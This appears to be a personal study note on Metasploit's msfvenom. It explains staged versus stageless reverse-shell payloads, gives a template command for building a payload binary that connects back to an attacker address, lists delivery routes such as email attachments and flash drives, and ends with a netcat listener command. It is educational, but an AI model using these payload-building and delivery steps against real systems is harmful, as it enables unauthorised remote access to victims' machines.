# Practicing with Msfvenom

- The command:
	- `msfvenom -l payloads`
	- lists all the the available payloads.
	- The list of payloads almost starts with the OS of the target
	- They are described by`staged` or `stageless`.

- #### Staged vs Stageless Payloads 
	- ###### Staged: 
		- Staged payloads create a way to send over more components of the attacks.
		- the payload `linux/x86/shell/reverse_tcp`, when run using the exploit module in metasploit, the payload wo;; send a small stage that will be executed on the target and then call back to the attacker machine to download the remainder of the payload over the network.
			- then executes the shellcode to establish a reverse shell.
	
	- ###### Stageless:
		- Stageless payloads do not have a stage. 
		- Example:
			- payload: `linux/zarch/meterpreter_reverse_tcp`
			- Using an exploit module in metasploit, this payload will be sent in its entirely across a network connection without a stage.
			- This could benefit in environments where the attacker don't have the access to much bandwidth and latency can interfere.
			
- ### Build A Stageless Payload:

	- `msfvenom -p <payload> LHOST=<Ip_add> LPORT=<port> -f <file_type> > <filname.<extension>>`

	- ##### Call MSFvenom:
		- `msfvenom`
			- Defines the tool used to make the payload.
		- `-p` 
			- This option indicates that msfvenom is creating a payload.
		- `<payload>`
			- choose the payload based on the architecture
		- `Address To connect back to`
			- when executed the payload will call back to the specified IP on the specified port.
		- `-f <file_type>`
			- the -f flag specifies the format the generated binary will be.
		- `> <filename.extension>`
			- creates an binary file which can be send to someone via any medium.

- ### Executing a Stageless Payload
	- Email message with the file attached
	- Download Link on a website
	- Combined with a Metasploit exploit mode
	- Via flash drive.
- ##### Nc Connection
	- `nc -lvnp <port>`
